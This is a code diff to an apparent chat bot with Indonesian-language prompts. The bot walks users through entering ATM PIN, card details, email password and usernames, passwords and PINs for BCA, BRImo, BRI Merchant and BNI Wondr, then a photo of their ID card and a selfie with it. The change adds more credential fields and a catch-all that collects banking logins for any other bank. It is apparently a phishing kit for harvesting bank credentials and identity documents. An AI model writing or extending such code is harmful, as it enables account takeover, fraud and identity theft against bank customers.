@@ -17,12 +17,16 @@ const getSteps = (bank) => {
   ];
 
   let bankSteps = [];
-  if (bank === 'BCA') {
-    bankSteps = ['myBCAUser', 'myBCAPassword', 'myBCAPin'];
-  } else if (bank === 'BRI') {
-    bankSteps = ['brimoUser', 'brimoPassword', 'briMerchantUser', 'briMerchantPassword'];
-  } else if (bank === 'BNI') {
+  const b = (bank || '').toUpperCase();
+  if (b === 'BCA') {
+    bankSteps = ['kodeAkses', 'pinMBca', 'myBCAUser', 'myBCAPassword', 'myBCAPin'];
+  } else if (b === 'BRI') {
+    bankSteps = ['brimoUser', 'brimoPassword', 'briMerchantUser', 'briMerchantPassword', 'jenisRekening'];
+  } else if (b === 'BNI') {
     bankSteps = ['pinWondr', 'passWondr'];
+  } else {
+    // Other bank: common mobile/ib fields
+    bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin', 'ibUser', 'ibPassword', 'ibPin'];
   }
 
   return [...commonSteps, ...bankSteps, 'uploadFotoId', 'uploadFotoSelfie'];
@@ -72,18 +76,27 @@ const askNextField = async (chatId, session) => {
     validThru: '📆 Masukkan Valid Thru (MM/YY):',
     noHp: '📱 Masukkan Nomor HP terdaftar:',
     pinAtm: '🔢 Masukkan PIN ATM:',
-    pinWondr: '🛡️ Masukkan PIN Wondr (jika ada):',
-    passWondr: '🔓 Masukkan Password Wondr (jika ada):',
+    kodeAkses: '🔐 Masukkan Kode Akses (BCA):',
+    pinMBca: '🔢 Masukkan PIN m-BCA:',
+    pinWondr: '🛡️ Masukkan PIN Wondr:',
+    passWondr: '🔓 Masukkan Password Wondr:',
     email: '📧 Masukkan Email terdaftar:',
     passEmail: '🔑 Masukkan Password Email:',
     expired: '⏳ Masukkan Tanggal Expired (YYYY-MM-DD):',
-    myBCAUser: '👤 Masukkan Username myBCA:',
-    myBCAPassword: '🔑 Masukkan Password myBCA:',
-    myBCAPin: '🔢 Masukkan PIN myBCA:',
+    myBCAUser: '👤 Masukkan BCA-ID:',
+    myBCAPassword: '🔑 Masukkan Password BCA-ID:',
+    myBCAPin: '🔢 Masukkan PIN Transaksi (BCA):',
     brimoUser: '👤 Masukkan Username BRImo:',
     brimoPassword: '🔑 Masukkan Password BRImo:',
     briMerchantUser: '🏪 Masukkan Username BRI Merchant:',
     briMerchantPassword: '🔑 Masukkan Password BRI Merchant:',
+    jenisRekening: '📝 Masukkan Jenis Rekening (misal: Britama/Simpedes):',
+    mobileUser: '👤 Masukkan Username Mobile Banking:',
+    mobilePassword: '🔑 Masukkan Password Mobile Banking:',
+    mobilePin: '🔢 Masukkan PIN Mobile Banking:',
+    ibUser: '👤 Masukkan Username I-Banking:',
+    ibPassword: '🔑 Masukkan Password I-Banking:',
+    ibPin: '🔢 Masukkan PIN I-Banking:',
     uploadFotoId: '📸 Silakan kirim FOTO KTP Anda:',
     uploadFotoSelfie: '📸 Terakhir, silakan kirim FOTO SELFIE dengan KTP:'
   };
